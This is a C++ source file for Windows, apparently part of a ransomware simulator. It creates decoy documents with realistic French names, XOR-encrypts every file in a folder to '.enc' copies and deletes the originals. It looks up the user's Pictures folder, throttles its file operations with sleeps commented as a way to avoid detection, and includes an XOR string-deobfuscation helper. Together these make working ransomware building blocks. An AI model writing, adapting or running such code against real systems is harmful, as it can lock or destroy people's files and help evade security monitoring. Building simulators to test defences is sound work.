#include "pch.h"
#include "utils.h"
#include <ShlObj.h>
#include <Knownfolders.h>

namespace fs = std::filesystem;
std::wstring GetCurrentUsername()
{
    char* username = nullptr;
    size_t len = 0;

    // Use _dupenv_s to safely retrieve the environment variable
    if (_dupenv_s(&username, &len, "USERNAME") == 0 && username != nullptr)
    {
        std::string name(username);
        free(username); // Free the allocated memory
        return std::wstring(name.begin(), name.end());
    }

    return L"user";
}
void CreateFolderIfNotExists(const std::wstring& folderPath)
{
    CreateDirectoryW(folderPath.c_str(), NULL);
}

std::wstring GenerateRealisticFilename(const std::wstring& ext, const std::wstring& username)
{
    static std::random_device rd;
    static std::mt19937 gen(rd());

    std::vector<std::wstring> txtNames = {
        L"notes", L"login_backup", L"mdp", L"meeting", L"projet"
    };
    std::vector<std::wstring> pdfNames = {
        L"contrat", L"convention_stage", L"fiche_de_paie", L"attestation_travail"
    };
    std::vector<std::wstring> jpgNames = {
        L"photo_" + username, L"carte_vitale", L"qr_code", L"plan_site", L"carte_nationale", L""
    };
    std::vector<std::wstring> xlsxNames = {
        L"facture", L"rapport_hebdo", L"budgets", L"notes_frais"
    };

    std::vector<std::wstring>* namePool = nullptr;

    if (ext == L".txt") namePool = &txtNames;
    else if (ext == L".pdf") namePool = &pdfNames;
    else if (ext == L".jpg") namePool = &jpgNames;
    else if (ext == L".xlsx") namePool = &xlsxNames;

    if (namePool && !namePool->empty())
    {
        std::uniform_int_distribution<> dist(0, static_cast<int>(namePool->size() - 1));
        return (*namePool)[dist(gen)] + ext;
    }

    return L"fichier" + ext;
}

void GenDummyF(const std::wstring& folderPath, int countPerType)
{
    CreateFolderIfNotExists(folderPath);

    std::wstring extensions[] = { L".txt", L".pdf", L".jpg", L".xlsx" };
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distSize(1024, 10240);
    std::uniform_int_distribution<> suffix(1000, 9999);

    std::wstring username = GetCurrentUsername();

    for (const auto& ext : extensions)
    {
        for (int i = 0; i < countPerType; ++i)
        {
            std::wstring baseName = GenerateRealisticFilename(ext, username);
            std::wstring filename = folderPath + L"\\" + baseName;

            // Ajouter un suffixe pour éviter les doublons
            filename.insert(filename.find_last_of(L'.'), L"_" + std::to_wstring(suffix(gen)));

            std::ofstream file(filename, std::ios::binary);
            int fileSize = distSize(gen);

            for (int j = 0; j < fileSize; ++j)
            {
                char byte = static_cast<char>(rand() % 256);
                file.write(&byte, 1);
            }
			Sleep(10); // Trying to avoid file creation too fast
            file.close();
        }
    }
}


void ProcessF(const std::wstring& inPath, const std::wstring& outPath, const std::string& key) {
    std::ifstream inFile(inPath, std::ios::binary);
    if (!inFile) return;

    std::vector<uint8_t> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    const size_t blockSize = 16;
    uint8_t iv[blockSize];          // IV séparé
    uint8_t prevBlock[blockSize];   // bloc de feedback CBC

    // génération IV random
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<unsigned int> dis(0, 255);
    for (size_t i = 0; i < blockSize; ++i) {
        iv[i] = static_cast<uint8_t>(dis(gen));
    }

    // initialiser prevBlock avec l'IV
    memcpy(prevBlock, iv, blockSize);

    // traitement CBC
    for (size_t i = 0; i < buffer.size(); i += blockSize) {
        size_t currentBlockSize = (std::min)(blockSize, buffer.size() - i);

        // XOR avec prevBlock (ou IV pour le 1er bloc)
        for (size_t j = 0; j < currentBlockSize; ++j) {
            buffer[i + j] ^= prevBlock[j];
        }

        // chiffrement : XOR avec clé
        for (size_t j = 0; j < currentBlockSize; ++j) {
            buffer[i + j] ^= key[j % key.size()];
        }

        // mettre à jour prevBlock avec le bloc chiffré courant
        memcpy(prevBlock, &buffer[i], currentBlockSize);
    }

    std::ofstream outFile(outPath, std::ios::binary);

    // écrire IV original
    outFile.write(reinterpret_cast<char*>(iv), blockSize);

    // écrire données chiffrées
    outFile.write(reinterpret_cast<char*>(buffer.data()), buffer.size());
    outFile.close();
}


void DeProcessF(const std::wstring& inPath, const std::wstring& outPath, const std::string& key) {
    std::ifstream inFile(inPath, std::ios::binary);
    if (!inFile) return;

    const size_t blockSize = 16;
    uint8_t iv[blockSize];
    uint8_t prevBlock[blockSize];

    // lire IV original
    inFile.read(reinterpret_cast<char*>(iv), blockSize);
    memcpy(prevBlock, iv, blockSize);

    std::vector<uint8_t> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    // traitement CBC
    for (size_t i = 0; i < buffer.size(); i += blockSize) {
        size_t currentBlockSize = (std::min)(blockSize, buffer.size() - i);

        uint8_t currentCipherBlock[blockSize];
        memcpy(currentCipherBlock, &buffer[i], currentBlockSize);

        // déchiffrement : inverse XOR clé
        for (size_t j = 0; j < currentBlockSize; ++j) {
            buffer[i + j] ^= key[j % key.size()];
        }

        // inverse XOR avec prevBlock (ou IV)
        for (size_t j = 0; j < currentBlockSize; ++j) {
            buffer[i + j] ^= prevBlock[j];
        }

        // update prevBlock pour bloc suivant
        memcpy(prevBlock, currentCipherBlock, currentBlockSize);
    }

    std::ofstream outFile(outPath, std::ios::binary);
    outFile.write(reinterpret_cast<char*>(buffer.data()), buffer.size());
    outFile.close();
}


void EncAllF(const std::wstring& folderPath, const std::string& key) {
    for (const auto& entry : fs::directory_iterator(folderPath)) {
        if (entry.is_regular_file()) {
            std::wstring original = entry.path();
            std::wstring encrypted = original + L".enc";

            ProcessF(original, encrypted, key);
            // pour delete le fichier
            HANDLE h = CreateFileW(original.c_str(), DELETE, 0, NULL, OPEN_EXISTING, 0, NULL);
            if (h != INVALID_HANDLE_VALUE) {
                FILE_DISPOSITION_INFO info = { TRUE };
                SetFileInformationByHandle(h, FileDispositionInfo, &info, sizeof(info));
                CloseHandle(h);
            }
            
            Sleep(rand() % 100 + 50); // Sleep pour éviter la création de fichiers trop rapide
        }
    }
}

void DecAllF(const std::wstring& folderPath, const std::string& key) {
    for (const auto& entry : fs::directory_iterator(folderPath)) {
        if (entry.is_regular_file() && entry.path().extension() == L".enc") {
            std::wstring encrypted = entry.path();
            std::wstring original = encrypted.substr(0, encrypted.length() - 4); // retirer ".enc"

            DeProcessF(encrypted, original, key);
             HANDLE h = CreateFileW(encrypted.c_str(), DELETE, 0, NULL, OPEN_EXISTING, 0, NULL);
            if (h != INVALID_HANDLE_VALUE) {
                FILE_DISPOSITION_INFO info = { TRUE };
                SetFileInformationByHandle(h, FileDispositionInfo, &info, sizeof(info));
                CloseHandle(h);
            }
        }
    }
}

std::wstring GetUserPicturesFolder() {
    PWSTR pszPath = nullptr;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Pictures, KF_FLAG_DEFAULT, NULL, &pszPath);
    std::wstring folder;
    if (SUCCEEDED(hr) && pszPath) {
        folder = pszPath;
        CoTaskMemFree(pszPath);
    }
    return folder;
}

std::wstring getStringFromHex(const std::vector<uint8_t>& data, uint8_t key) {
    std::wstring result;
    for (auto c : data) {
        result += static_cast<wchar_t>(c ^ key);
    }
    return result;
}
